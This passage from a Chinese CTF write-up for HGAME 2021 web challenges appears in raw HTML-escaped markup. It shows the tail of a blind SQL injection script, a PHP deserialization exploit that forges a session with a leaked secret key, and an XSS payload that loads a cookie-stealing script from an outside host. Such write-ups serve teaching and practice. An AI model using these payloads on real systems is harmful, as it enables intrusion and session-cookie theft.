                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1.5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                    &lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                    &lt;span class=&#34;n&#34;&gt;top&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;continue&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;top&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;#hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}&lt;/p&gt;
&lt;h3 id=&#34;arknights&#34;&gt;Arknights&lt;/h3&gt;
&lt;p&gt;考点：PHP反序列化&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215121944.png&#34; alt=&#34;image-20210215121933780&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;题目是一个类似于抽卡的网站，描述里面说&amp;quot;r4u用git部署到了自己的服务器上&amp;quot;，那么自然而然Githack把源码hack下来。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DArknights.zip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;source.zip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;simulator.php&lt;/code&gt;我们可以看到有很多类，其中第146行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Eeeeeeevallllllll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$msg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;坏坏liki到此一游&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;有一个echo操作，那么我们全局搜索&lt;code&gt;__toString&lt;/code&gt;。第93行：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;CardsPool&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;……&lt;/span&gt;
        
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__toString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;pop链很明确，就看如何触发反序列化了。&lt;/p&gt;
&lt;p&gt;第137行&lt;code&gt;Session::extract()&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;extract&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;

        &lt;span class=&#34;nv&#34;&gt;$sess_array&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$sess_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$sign&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$sess_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$sign&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;secret_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;sessiondata&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nx&#34;&gt;unset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;sessiondata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;go away! you hacker!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;他会把session的&lt;code&gt;.&lt;/code&gt;前面的内容反序列化，并且会做一个加盐的判断，但是密钥在103行已经给了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;SECRET_KEY&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;那么我们可以编写一个exp：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Eeeeeeevallllllll&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$msg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;CardsPool&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$cards&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$pop&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Eeeeeeevallllllll&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$pop&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;msg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;CardsPool&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//echo serialize($pop);
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$sign&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$sign&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;$sess_array = explode(&amp;#34;.&amp;#34;, $payload);
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;$data = base64_decode($sess_array[0]);
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;echo $data,&amp;#34;\n&amp;#34;;
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;$sign = base64_decode($sess_array[1]);
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;echo $sign,&amp;#34;\n&amp;#34;;
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;if($sign === md5($data . $key)){
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;    unserialize($data);
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;}else{
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;    echo $sign;
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;    die(&amp;#34;go away! you hacker!&amp;#34;);
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;}
&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;*/&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发送session即可得到flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210215130724.png&#34; alt=&#34;image-20210215130722662&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;post-to-zuckonit20&#34;&gt;Post to zuckonit2.0&lt;/h3&gt;
&lt;p&gt;考点：XSS&lt;/p&gt;
&lt;p&gt;网站是一个创建笔记的站点，存在XSS漏洞&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216130625.png&#34; alt=&#34;image-20210216130624020&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;/static/www.zip&lt;/code&gt;给了源码：&lt;a class=&#34;link&#34; href=&#34;https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DPost_to_zuckonit2.0.zip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;source.zip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;和week2的XSS比起来多一个功能，可以替换批量字符串，并且在&lt;code&gt;/preview&lt;/code&gt;查看替换的结果&lt;/p&gt;
&lt;p&gt;审计源码，在添加留言的存在一个waf：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216125153.png&#34; alt=&#34;image-20210216125152416&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;跟进函数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;escape_index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;original&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;content&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;original&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;content_iframe&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;re&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sub&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;^(&amp;lt;?/?iframe)\s+.*?(src=[&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;][a-zA-Z/]{1,8}[&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;]).*?(&amp;gt;?)$&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\1 \2 \3&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#只留src属性&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;content_iframe&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;content&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;re&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;^(&amp;lt;?/?iframe)\s+(src=[&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;][a-zA-Z/]{1,8}[&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;])$&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;content_iframe&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;content&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;re&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sub&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;*/?(.*?)&amp;gt;?&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看到只允许我们添加类似于&lt;code&gt;&amp;lt;iframe scr=&amp;quot;xxx&amp;quot;&amp;gt;&lt;/code&gt;的标签，并且&lt;code&gt;xxx&lt;/code&gt;限制在1-8位，显然没办法直接执行JS。&lt;/p&gt;
&lt;p&gt;不过我们可以添加&lt;code&gt;&amp;lt;iframe scr=&amp;quot;/preview &amp;quot;&amp;gt;&lt;/code&gt;来使得index能直接看到&lt;code&gt;/preview&lt;/code&gt;页面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216124755.png&#34; alt=&#34;image-20210216124754639&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;再通过字符串替换功能，把&lt;code&gt;xxx&lt;/code&gt;换成&lt;code&gt;javascript:xxxxx&lt;/code&gt;，形成&lt;code&gt;&amp;lt;iframe src=&#39;javascript:alter(1)&#39;&amp;gt;&lt;/code&gt;即可XSS&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;nx&#34;&gt;javascript&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;atob&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL2Nvb2tpZS5qcyI+PC9zY3JpcHQ+&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;小手一抖，cookie到手：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210216124700.png&#34; alt=&#34;image-20210216124651414&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;hgame{simple_csp_bypass&amp;amp;a_small_mistake_on_the_replace_function}&lt;/p&gt;
&lt;h3 id=&#34;post-to-zuckonit-another-version&#34;&gt;Post to zuckonit another version&lt;/h3&gt;
&lt;p&gt;考点：XSS，HttpOnly绕过&lt;/p&gt;
&lt;p&gt;说是绕&lt;code&gt;HttpOnly&lt;/code&gt;，实则并没有绕；&lt;/p&gt;
&lt;p&gt;相比于上一道XSS：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;增加了HttpOnly，使得我们直接用js不能直接获取到本地cookie；&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220173620.png&#34; alt=&#34;image-20210220173619352&#34;  /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修改了功能，把直接替换字符串换成了查找字符串&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210220173858.png&#34; alt=&#34;image-20210220173856459&#34;  /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;依然在&lt;code&gt;static/www.zip&lt;/code&gt;给出了源码：&lt;a class=&#34;link&#34; href=&#34;https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/HGAME2021/%5BHGAME2021%5DPost_to_zuckonit2.0_another_version.zip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;source.zip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;源码大同小异，甚至连waf都没变，单独在字符串替换功能上修改为正则匹配并且在两端加&lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt;标签，得到高亮效果&lt;/p&gt;
